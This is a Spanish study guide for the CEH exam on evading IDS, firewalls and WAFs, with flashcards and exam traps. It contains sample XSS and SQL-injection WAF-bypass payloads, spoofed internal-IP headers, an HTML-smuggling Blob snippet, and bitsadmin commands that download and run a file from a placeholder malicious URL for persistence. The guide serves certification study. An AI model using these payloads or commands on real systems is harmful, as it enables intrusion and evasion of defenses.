# M12_03 — Evading IDS/Firewalls
> Módulo 12 / Subapartado 3 — IDS/Firewall Evasion Techniques

---

## 1. Conceptos y definiciones

### 🔴 Mapa completo de técnicas de evasión

| Categoría | Técnicas |
|---|---|
| **Identificación** | Port Scanning, Firewalking, Banner Grabbing |
| **Evasión de red/sesión** | IP Spoofing, Source Routing, Tiny Fragments, Proxy/Anonymizer, Tunneling (ICMP/ACK/HTTP/SSH/DNS) |
| **Evasión de IDS específica** | Insertion, Evasion, Session Splicing, Fragmentation, TTL Attacks, Urgency Flag, Invalid RST, Desynchronization, Polymorphic/ASCII Shellcode, Unicode Evasion, Obfuscation, DGA, Encryption, Flooding, DoS, False Positive Generation |
| **Evasión de WAF/aplicación** | XSS (ASCII/Hex/Obfuscation), HTTP Header Spoofing, Blacklist Detection Abuse, Fuzzing/Brute-force, SSL/TLS Cipher Abuse, HTML Smuggling, BITS Abuse |
| **Evasión por infraestructura** | External Systems, MITM (DNS poisoning), Content (malicious files) |

---

### Fase de Identificación

#### Firewalking
Técnica que usa valores **TTL** para determinar los filtros ACL de un gateway y mapear redes detrás de firewalls. Envía paquetes TCP o UDP con TTL = (número de hops hasta el firewall + 1). Si el paquete atraviesa el gateway, el siguiente hop lo descarta con ICMP "TTL exceeded in transit", confirmando que el puerto/protocolo está permitido.

- Herramienta principal: **Firewalk** — dos fases: network discovery + scanning phase. Disponible en distribuciones Linux open-source.
- Alternativa: script `--script=firewalk` de **Nmap**.

#### Banner Grabbing
Lectura de banners de servicio para identificar fabricante y versión del firmware de firewall/IDS. Los **tres servicios** que emiten banners por defecto: **FTP, Telnet y servidores web**. El firewall no bloquea esta técnica porque la conexión parece legítima.

Ejemplo SMTP: `telnet mail.targetcompany.org 25`

---

### 🔴 Técnicas de Tunneling

Todas encapsulan tráfico malicioso dentro de un protocolo permitido por defecto por el firewall/IDS.

#### ICMP Tunneling
- ICMP es requerido para ping/traceroute → administradores lo dejan abierto.
- **RFC 792 no define qué debe ir en la porción de datos** de los paquetes ICMP → payload arbitrario, la mayoría de firewalls/IDS no lo inspeccionan.
- Técnica: insertar backdoor o comandos en la porción de datos de paquetes ICMP Echo.
- Herramienta: **ICMPTX** (https://codeberg.org).

#### ACK Tunneling
- Los firewalls de packet-filtering basan sus reglas en paquetes **SYN**.
- Los ACK se asocian a sesiones establecidas → menos escrutados. Para cada SYN puede haber muchos ACK → el firewall reduce la inspección de ACK para no saturarse.
- Técnica: inyectar payloads maliciosos en paquetes TCP con **bit ACK activado**.
- Herramientas: **Hping**, **Nping**.

#### HTTP Tunneling
- Requiere servidor web público con **puerto 80 abierto y sin filtrar**.
- El payload se encapsula dentro de tráfico HTTP → la mayoría de firewalls/IDS no inspeccionan el payload HTTP.
- Caso de uso: usar FTP cuando sólo están abiertos los puertos 80 y 443.
- Herramientas: **HTTPort + HTTHost**, **Chisel**, **Tunna**.

**Dos modos de HTTPort:**

| Modo | Velocidad | Cifrado | Requisito |
|---|---|---|---|
| **SSL/CONNECT mode** | Más rápido | Sin cifrado | Proxy con CONNECT HTTP habilitado (deshabilitado por defecto) |
| **Remote host (HTTHost)** | Más lento | Cifrado fuerte | HTTHost instalado fuera de la red bloqueada |

HTTHost escucha en **puerto 90**.

#### SSH Tunneling
- Encapsula tráfico no cifrado (ej. FTP) dentro de una sesión SSH cifrada. El IDS no puede analizar el contenido cifrado.
- Herramientas: **OpenSSH**, **Bitvise SSH Client/Server**.
- Sintaxis OpenSSH: `ssh -f user@certifiedhacker.com -L 5000:certifiedhacker.com:25 -N`
  - `-f` → background mode
  - `-L local-port:host:remote-port` → local port forwarding
  - `-N` → no ejecutar comando en el sistema remoto

**Tipos de port forwarding con Bitvise:**

| Tipo | Propósito | Flexibilidad |
|---|---|---|
| **Local Port Forwarding** | Redirige puerto local específico a servicio remoto concreto | Baja — un servicio |
| **Remote Port Forwarding** | Expone servicio local a red remota | Media |
| **Dynamic Port Forwarding** | Crea proxy SOCKS a través del túnel SSH | Alta — enruta cualquier tráfico |

Dynamic: `Listen Interface: 127.0.0.1` → configurar aplicaciones como proxy SOCKS en `localhost:1080`.

#### DNS Tunneling
- DNS usa **UDP**, límite de **255 bytes en consultas salientes**, sólo permite **caracteres alfanuméricos y guiones**.
- **DNSSEC no detecta DNS tunneling** — sólo verifica autenticidad/integridad de respuestas DNS, no inspecciona el contenido.
- Técnica: dividir datos en chunks codificados dentro de queries/responses DNS.
- Herramientas: **iodine**, **dnscat2** — tunelan tráfico a través del **puerto 53 (UDP)**.
- Arquitectura iodine: **iodined (servidor)** con IP pública decodifica datos y accede a Internet en nombre del cliente; **iodine (cliente)** codifica tráfico saliente en queries DNS.

---

### 🔴 Técnicas de Evasión de IDS — Nivel Paquete/Sesión

#### Insertion Attack
El IDS acepta paquetes que el host destino **rechaza**. Paquetes inválidos (checksum IP incorrecto, TTL ajustado para llegar al IDS pero no al destino) se insertan en el stream del IDS. Resultado: el IDS reconstruye una cadena diferente a la que recibe el host.

**IDS tiene MÁS paquetes que el destino.** Condición: el NIDS es menos estricto que la red interna.

Ejemplo: atacante envía "phf" (exploit CGI) pero inserta "oney" → el IDS lee "phoneyf" → no detecta el patrón "phf".

#### Evasion Attack
El IDS **descarta** paquetes que el host destino **acepta**. El IDS pierde partes del stream.

**IDS tiene MENOS paquetes que el destino.**

| | Insertion | Evasion |
|---|---|---|
| ¿Quién acepta el paquete problemático? | IDS (no el host) | Host (no el IDS) |
| Paquetes IDS vs destino | IDS tiene MÁS | IDS tiene MENOS |
| IDS es... | Más laxo que el host | Más estricto que el host |

#### Session Splicing
Divide el tráfico de ataque en un número excesivo de paquetes de pocos bytes para que ninguno active el IDS. Explota que algunos IDS no reconstruyen sesiones antes de hacer pattern-matching. Si el IDS supera su timeout de reassembly, deja de ensamblar ese stream — cualquier dato posterior pasa sin inspección.

- Táctica adicional: añadir **delays entre paquetes** para superar el timeout de reassembly del IDS.
- Herramienta: **Nessus**.

#### Fragmentation Attack
Explota diferencias en los **timeouts de reassembly** entre IDS y host destino.

**Escenario 1** — `timeout_IDS < timeout_host`:
- IDS timeout: 10 s; host timeout: 20 s. Atacante envía frag-2 a los 15 s → el IDS ya descartó por timeout; el host ensambla y recibe el ataque.

**Escenario 2** — `timeout_IDS > timeout_host`:
- IDS timeout: 60 s; host timeout: 30 s. Atacante envía fragments con payloads falsos (frag-2', frag-4') → el host los descarta; luego envía frag-1 y frag-3 válidos. El IDS ensambla {1, 2', 3, 4'} → checksum inválido → descarta. Atacante reenvía frag-2 y frag-4 válidos → el IDS ya los perdió; el host ensambla {1, 2, 3, 4} y recibe el ataque.

#### TTL Attacks
Ajusta TTL de fragments para llegar al IDS pero no al host (o viceversa). Requiere conocimiento previo de la topología de red obtenido con **traceroute**.

Flujo típico: Frag-1 TTL alto → llega a IDS y víctima. Frag-2' (payload falso) TTL=1 → llega al IDS, el router lo descarta antes de la víctima. Frag-3 TTL alto → llega a ambos. IDS ensambla {1, 2', 3} = payload falso. Atacante envía frag-2 válido → víctima ensambla {1, 2, 3} = ataque exitoso.

#### Urgency Flag (URG)
Algunos IDS procesan todos los bytes sin considerar el urgency pointer; el host sólo procesa los datos urgentes (ignora datos anteriores al pointer). El atacante coloca basura antes de los datos urgentes — el IDS la procesa, el host no → IDS tiene más datos que el host.

**RFC 1122:** si un segmento TCP contiene urgency pointer, **se pierde exactamente 1 byte de datos después de los datos urgentes**.

#### Invalid RST Packets
RST con **checksum TCP incorrecto**: el host verifica el checksum → descarta el RST → continúa comunicando. El IDS acepta el RST inválido → interpreta fin de sesión → deja de monitorizar. El atacante continúa comunicándose con el host sin detección.

#### Desynchronization

**Pre-Connection SYN:** SYN con checksum inválido antes de la conexión real. Si el IDS no verifica el checksum, ajusta su sequence number al SYN falso → queda desincronizado.

**Post-Connection SYN:** SYN dentro de una sesión ya establecida con sequence numbers divergentes. El host lo ignora. El IDS resincroniza su sequence number → ignora el tráfico legítimo posterior de la sesión original.

#### Polymorphic Shellcode
Cifra el payload con algoritmo desconocido e incluye el código de descifrado en el propio paquete. El shellcode **se reescribe completamente en cada envío** → ninguna firma fija puede detectarlo. Usa buffer-overflow apuntando el "return address" al punto de entrada del decryptor.

#### ASCII Shellcode
Shellcode compuesto únicamente por caracteres ASCII. Bypasea restricciones de caracteres en inputs de tipo string y evita pattern matching del IDS (que busca secuencias de bytes no-ASCII típicas de shellcode). Limitación: no todas las instrucciones ensamblador tienen equivalente ASCII directo.

#### Unicode Evasion
Unicode permite múltiples representaciones del mismo carácter (ej: `\` = `5C`, `C19C` o `E0819C`). El atacante convierte strings de ataque a Unicode → el IDS no reconoce el patrón; el servidor web lo decodifica correctamente.

#### Obfuscating
Codifica el payload de forma que el host pueda descodificarlo pero el IDS no. Métodos: Unicode, mezcla mayúsculas/minúsculas, steganografía, código polimórfico. Efectivo en protocolos cifrados como HTTPS.

#### False Positive Generation
Genera un volumen masivo de alertas falsas específicamente diseñadas para ese IDS con el fin de ocultar el tráfico de ataque real entre el ruido. El IDS sigue funcionando pero el equipo de seguridad no puede diferenciar ataques reales.

#### DoS contra el IDS
Consume recursos del IDS para incapacitarlo: CPU (operaciones costosas), Memoria (asignación masiva inútil), Disco (saturación de logs), Red (saturación de tráfico). Si se conoce la IP del servidor central de logs, un DoS contra él elimina el registro de alertas de todo el entorno.

#### Encryption y Flooding
- **Encryption:** sesión cifrada SSH/SSL/VPN → el IDS no puede analizar el contenido.
- **Flooding:** inunda el IDS con tráfico basura para agotar recursos de análisis → tráfico malicioso pasa sin inspección.

---

### 🔴 Evasión de WAF mediante XSS

#### ASCII Encoding
```
<script>alert("XSS")</script>
→ <script>String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)</script>
```
Herramienta: plugin **Hackbar** para Firefox.

#### Hex Encoding
```
<script>alert("XSS")</script>
→ %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
```

#### Obfuscation (Case Mixing)
```
<script>alert("XSS")</script>  →  <sCRiPt>aLeRT("XSS")</sCriPT>
```

#### HTTP Header Spoofing
WAFs permiten queries de direcciones internas. El atacante añade headers que simulan origen interno:
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
Herramienta: **Burp Suite**.

#### Blacklist Detection Abuse
Fingerprinting del WAF → identificar keywords bloqueados → construir payloads sin esas keywords.

Ejemplo SQL (bloqueados: `union`, `select`):
- Bloqueado: `union select username, pwd from employees`
- Evade: `1 || (select username, pwd from employees where userID = 1001) = 'admin'`

Con `where` y `limit` también bloqueados:
- Evade: `1 || (select username from employees group by userID having userID = 1001) = 'admin'`

#### SSL/TLS Cipher Abuse
Si el servidor acepta un cipher que el WAF no soporta → el WAF no puede inspeccionar el tráfico. Herramientas: **sslscan2**, **abuse-ssl-bypass-waf.py**, **curl**.

---

### HTML Smuggling
Inyecta código malicioso en HTML5/JavaScript usando un **JavaScript Blob** con MIME compatible para auto-descarga. El fichero malicioso se construye directamente en el navegador → nunca viaja por la red como ejecutable → bypasea firewalls, proxies y email gateways.

```javascript
var fakeBlob = new Blob([myfakeFile], {type: 'octet/stream'});
var myfileUrl = URL.createObjectURL(fakeBlob);
myAnchor.href = myfileUrl;
myAnchor.click();
```

**Señales:** ZIP con JavaScript dentro; adjunto cifrado; código script sospechoso en fichero HTML; decodificación Base64 en fichero HTML.

**Countermeasures clave:** bloquear auto-ejecución de `.js` y `.jse`; implementar CSP headers; whitelist de HTML tags/atributos/protocolos.

---

### Windows BITS (Background Intelligent Transfer Service)
Servicio Windows para distribución de actualizaciones automáticas. Las organizaciones ignoran el tráfico BITS por considerarlo legítimo. Los jobs BITS corren a nivel de sistema → trusted → bypasean firewalls/IDS.

**Comandos bitsadmin para persistencia:**
```
bitsadmin /create persistence
bitsadmin /addfile persistence <Malicious_URL> <Local_Path>
bitsadmin /SetNotifyCmdLine persistence <Local_Path> NULL
bitsadmin /resume persistence
```

**Countermeasures clave:** **BitsParser** para auditar tráfico BITS; monitorizar `Microsoft-Windows-BITS-Client/Operational` event log; GPO para limitar creación de BITS jobs.

---

### 🔴 Domain Generation Algorithms (DGA)
Genera dinámicamente dominios para C2, evitando bloqueos de IPs estáticas y dominios conocidos. Usa un **seed** compartido (número o frase) entre malware y servidor C2 — ambos generan la misma secuencia de dominios de forma independiente.

| Tipo | Mecanismo | Ejemplo | Dificultad de detección |
|---|---|---|---|
| **Character-based** | Seeds aleatorias → letras/números | `ab5cde8.com` | Moderada |
| **PRNG-based** | Seed = **fecha/hora del sistema** → secuencia predecible para ambos | `hbeajidfg.com` | Moderada |
| **Dictionary-based** | Combina palabras aleatorias → dominios legibles | `applebanana.com` | Difícil |
| **High-collision** | Imita dominios reales con TLDs populares (.com, .org) | `test.com` | Muy difícil |

---

### Bypass mediante sistemas externos y MITM

**Sistemas externos:** atacante sniffa tráfico de usuario legítimo → roba session ID y cookies → emite `OpenURL()` al proceso del navegador → redirige a servidor del atacante → ejecuta código malicioso en la máquina del usuario.

**MITM vía DNS poisoning:** Atacante corrompe caché DNS corporativa → usuario solicita dominio legítimo y recibe IP del atacante → el atacante tuneliza el tráfico HTTP del usuario hacia el host real → el tráfico parece legítimo para el firewall/IDS → código malicioso se ejecuta en la máquina del usuario.

---

## 2. Exam Traps ⚠️

⚠️ **[Insertion vs Evasion — quién tiene más paquetes]**
Insertion: el IDS tiene MÁS paquetes (acepta los que el host rechaza). Evasion: el IDS tiene MENOS paquetes (descarta los que el host acepta). El examen invierte deliberadamente estos roles como trampa principal de este módulo.

⚠️ **[Firewalking — TTL = hops + 1]**
El TTL se establece a uno más que el número de hops hasta el firewall. Si el firewall está a 3 hops, TTL = 4. No es el número exacto de hops.

⚠️ **[ICMP Tunneling — RFC 792]**
La razón técnica por la que funciona es que RFC 792 no define qué debe ir en la porción de datos de los paquetes ICMP. Dato exacto de examen.

⚠️ **[ACK Tunneling — tipo de paquete explotado]**
Explota paquetes TCP con bit **ACK** activado, no SYN ni ningún otro flag. La razón es que los firewalls basan sus reglas de inspección en SYN.

⚠️ **[HTTP Tunneling — puerto de HTTHost]**
HTTHost escucha en **puerto 90**, no en 80. El puerto 80 es el del servidor web público destino. El examen confunde ambos.

⚠️ **[DNS Tunneling — DNSSEC no protege]**
DNSSEC no detecta DNS tunneling. DNSSEC sólo verifica autenticidad e integridad de respuestas DNS, no inspecciona el contenido de las queries. Si el examen lo presenta como contramedida → incorrecto.

⚠️ **[SSH Tunneling — flags OpenSSH]**
`-f` = background, `-L local:host:remote` = local port forwarding, `-N` = no ejecutar comando en remoto. El examen puede presentar estas flags con significados intercambiados.

⚠️ **[Session Splicing — herramienta CEH]**
La herramienta mencionada específicamente para session splicing en el CEH es **Nessus**, no Metasploit ni Nmap.

⚠️ **[Fragmentation — condición de éxito por escenario]**
Escenario 1: `timeout_IDS < timeout_host`. Escenario 2: `timeout_IDS > timeout_host`. El examen puede presentar ambos y pedir identificar cuál describe cada condición.

⚠️ **[TTL Attacks — requisito previo obligatorio]**
Requieren conocimiento previo de la topología de red. Herramienta: **traceroute**. Sin este conocimiento el TTL attack no puede ejecutarse.

⚠️ **[Urgency Flag — RFC 1122 dato exacto]**
Se pierde exactamente **1 byte** de datos después de los datos urgentes. Dato numérico de examen.

⚠️ **[Invalid RST — comportamiento asimétrico]**
Host verifica el checksum → descarta RST → continúa comunicando. IDS acepta RST inválido → cree que la sesión terminó. El examen puede preguntar cuál de los dos verifica el checksum.

⚠️ **[DGA PRNG — seed es fecha/hora]**
En PRNG-DGA la seed incluye la fecha y hora del sistema. Dato que distingue PRNG del resto de tipos DGA.

⚠️ **[HTML Smuggling — mecanismo técnico]**
Usa JavaScript **Blob** para construir el fichero malicioso directamente en el navegador. El fichero nunca viaja por la red como ejecutable → bypasea proxies y email gateways.

⚠️ **[BITS — nivel de ejecución]**
Los jobs BITS corren a **nivel de sistema** → se consideran trusted → bypasean soluciones de seguridad. Herramienta de auditoría: **BitsParser**.

⚠️ **[XSS WAF Bypass — ASCII vs Hex]**
ASCII usa `String.fromCharCode()` con valores decimales. Hex usa `%XX` URL encoding. Son técnicas distintas que el examen puede presentar como equivalentes.

---

## 3. Nemotécnicos

**Técnicas de tunneling — "IAHSD":**
**I**CMP (RFC 792, payload arbitrario) → **A**CK (bit ACK, menos escrutado) → **H**TTP (puerto 80) → **S**SH (cifrado, puerto 22) → **D**NS (puerto 53, UDP, 255 bytes)

**Insertion vs Evasion — regla del surplus/ausencia:**
- In**s**ertion → IDS tiene **+** más paquetes — "s" de surplus
- Ev**a**sion → IDS tiene **-** menos paquetes — "a" de ausencia

**Tipos de DGA — "CPDH":**
**C**haracter-based → **P**RNG (fecha/hora como seed) → **D**ictionary (palabras legibles) → **H**igh-collision (imita dominios reales)

**Flags OpenSSH local port forwarding — "fLN":**
`-f` (fondo/background) `-L` (Local forwarding) `-N` (Nada en remoto)

**Tres servicios de banner grabbing — "FTW":**
**F**TP + **T**elnet + **W**eb server

**XSS WAF bypass cuatro técnicas — "AHOB":**
**A**SCII (String.fromCharCode) → **H**ex (%XX) → **O**bfuscation (MaYúScUlAs) → **B**lacklist abuse

**Fragmentation regla de timeouts:**
- IDS timeout MENOR → Escenario 1 (IDS descarta antes que el host)
- IDS timeout MAYOR → Escenario 2 (atacante fuerza checksum inválido en IDS)

---

## 4. Flashcards

**Q:** ¿Qué RFC define la operación ICMP y por qué es relevante para ICMP tunneling?
**A:** RFC 792. No define qué debe ir en la porción de datos de los paquetes ICMP. Cualquier dato, incluido un backdoor, puede insertarse en ese campo arbitrario sin que la mayoría de firewalls/IDS lo inspeccionen.

---

**Q:** ¿Cuál es la diferencia fundamental entre Insertion y Evasion en la evasión de IDS?
**A:** Insertion: el IDS acepta paquetes que el host rechaza → IDS tiene más paquetes que el destino. Evasion: el IDS descarta paquetes que el host acepta → IDS tiene menos paquetes que el destino. En ambos casos IDS y host reconstruyen streams diferentes.

---

**Q:** ¿Cuál es la condición de éxito del Fragmentation Attack Escenario 1?
**A:** El timeout de reassembly del IDS es MENOR que el del host víctima. El atacante envía el segundo fragment después del timeout del IDS pero antes del timeout del host.

---

**Q:** ¿Qué herramienta menciona específicamente el CEH para session splicing?
**A:** Nessus.

---

**Q:** ¿Qué hace un Invalid RST packet y cómo afecta de forma diferente al IDS y al host?
**A:** El IDS acepta el RST con checksum inválido y cree que la sesión terminó → deja de monitorizar. El host verifica el checksum → descarta el RST → continúa la comunicación. El atacante sigue comunicándose con el host sin que el IDS lo detecte.

---

**Q:** ¿Por qué los paquetes ACK son el vector de ACK tunneling?
**A:** Los firewalls basan sus reglas de inspección en paquetes SYN. Los ACK se asocian a sesiones establecidas y reciben menos inspección. Para cada SYN puede haber muchos ACK, lo que hace inviable inspeccionarlos todos con el mismo rigor.

---

**Q:** ¿Qué tipo de DGA usa la fecha y hora del sistema como seed?
**A:** PRNG-based DGA. Implica que la secuencia de dominios generados es predecible tanto para el atacante como para el malware, permitiendo sincronización sin comunicación directa.

---

**Q:** ¿En qué puerto escucha HTTHost y cuál es su función en HTTP tunneling?
**A:** Puerto 90. HTTHost es el componente servidor de HTTPort, instalado fuera de la red bloqueada. Actúa como relay entre HTTPort y los servidores destino reales.

---

**Q:** ¿Cuál es el requisito previo para ejecutar un TTL Attack y qué herramienta lo proporciona?
**A:** Conocimiento previo de la topología de red (número de routers entre atacante y víctima). Se obtiene con traceroute.

---

**Q:** ¿Qué establece RFC 1122 sobre el Urgency Flag en TCP?
**A:** Si un segmento TCP contiene un urgency pointer, se pierde exactamente 1 byte de datos después de los datos urgentes.

---

**Q:** ¿Por qué DNSSEC no protege contra DNS tunneling?
**A:** DNSSEC sólo verifica la autenticidad e integridad de las respuestas DNS, no inspecciona el contenido de las queries/responses. Los datos maliciosos se embeben dentro de tráfico DNS aparentemente legítimo.

---

**Q:** ¿Qué función JavaScript usa el bypass WAF mediante ASCII encoding en XSS?
**A:** String.fromCharCode(). Representa el payload como valores ASCII decimales que el JavaScript convierte automáticamente a caracteres en tiempo de ejecución.

---

**Q:** ¿Qué es HTML Smuggling y por qué bypasea firewalls y proxies?
**A:** Técnica que usa un JavaScript Blob para construir el fichero malicioso directamente en el navegador del cliente. El fichero nunca viaja por la red como ejecutable, por lo que firewalls, proxies y email gateways no tienen nada que inspeccionar.

---

**Q:** ¿Cómo usa Windows BITS un atacante para establecer persistencia y por qué bypasea el IDS?
**A:** Crea un BITS job con bitsadmin con un NotifyCmdLine que ejecuta el payload cuando el job termina. Los jobs BITS corren a nivel de sistema → se consideran trusted → no son bloqueados por firewalls/IDS.

---

**Q:** ¿Cuál es la diferencia entre Local y Dynamic Port Forwarding en SSH con Bitvise?
**A:** Local Port Forwarding redirige un puerto local específico a un servicio remoto concreto. Dynamic Port Forwarding crea un proxy SOCKS capaz de enrutar cualquier tipo de tráfico de red de forma flexible.

---

**Q:** ¿Qué caracteres permite DNS y cuál es el límite de tamaño de las queries salientes?
**A:** Sólo caracteres alfanuméricos y guiones. Límite: 255 bytes en consultas salientes.

---

**Q:** ¿Qué es firewalking y cuál es el valor de TTL que se usa?
**A:** Técnica que usa TTL = (hops hasta el firewall + 1) para determinar qué puertos/protocolos están permitidos. Un ICMP "TTL exceeded in transit" confirma que el paquete atravesó el gateway. Herramientas: Firewalk, script firewalk de Nmap.

---

**Q:** ¿Cuál es la diferencia entre Pre-Connection SYN y Post-Connection SYN en desynchronization?
**A:** Pre-Connection SYN: envía SYN con checksum inválido antes de la conexión real para desincronizar el sequence number del IDS. Post-Connection SYN: envía SYN dentro de una sesión establecida para que el IDS resincronice y luego ignore el tráfico legítimo de la sesión original.

---

## 5. Confusión frecuente

**Insertion vs Evasion**
- Insertion: IDS más laxo → acepta paquetes que el host rechaza → IDS tiene MÁS paquetes.
- Evasion: IDS más estricto → descarta paquetes que el host acepta → IDS tiene MENOS paquetes.
- **Criterio de decisión:** ¿quién tiene más información del stream? IDS → Insertion. Host → Evasion.

---

**Session Splicing vs Fragmentation Attack**
- Session Splicing: divide el payload en muchos paquetes TCP pequeños para evadir pattern-matching. No depende de timeouts.
- Fragmentation: divide paquetes IP en fragments, explotando diferencias de timeout de reassembly entre IDS y host.
- **Criterio de decisión:** si el escenario menciona timeout de reassembly → Fragmentation. Si menciona paquetes pequeños sin referencia a timeouts → Session Splicing.

---

**ICMP Tunneling vs DNS Tunneling**
- ICMP: porción de datos de Echo packets (RFC 792 no la define). Herramienta: ICMPTX. Requiere ICMP abierto.
- DNS: codifica datos en queries/responses (puerto 53, UDP). Herramientas: iodine, dnscat2. Límite 255 bytes.
- **Criterio de decisión:** sólo DNS permitido → DNS tunneling. ICMP abierto → ICMP tunneling.

---

**Polymorphic Shellcode vs ASCII Shellcode**
- Polymorphic: cifra el payload, incluye decryptor en el paquete, se reescribe en cada envío.
- ASCII Shellcode: usa sólo caracteres ASCII. Bypasea restricciones de input de strings y pattern matching.
- **Criterio de decisión:** si menciona cifrado + decryptor embebido → Polymorphic. Si menciona restricciones de caracteres en input fields → ASCII Shellcode.

---

**False Positive Generation vs DoS contra IDS**
- False Positive Generation: genera alertas falsas para ocultar ataques reales. El IDS sigue funcionando.
- DoS contra IDS: consume recursos (CPU/memoria/disco/red) para dejar el IDS inoperativo.
- **Criterio de decisión:** ocultar ataques entre ruido → False Positive Generation. Incapacitar el IDS → DoS.

---

**HTTP Tunneling vs SSH Tunneling**
- HTTP Tunneling: encapsula en HTTP (puerto 80). Sin cifrado por defecto. Requiere servidor web público con puerto 80 abierto.
- SSH Tunneling: encapsula en SSH (puerto 22). Cifrado por defecto — el IDS no puede analizar el contenido.
- **Criterio de decisión:** sólo puerto 80 disponible → HTTP Tunneling. Evasión por cifrado → SSH Tunneling.
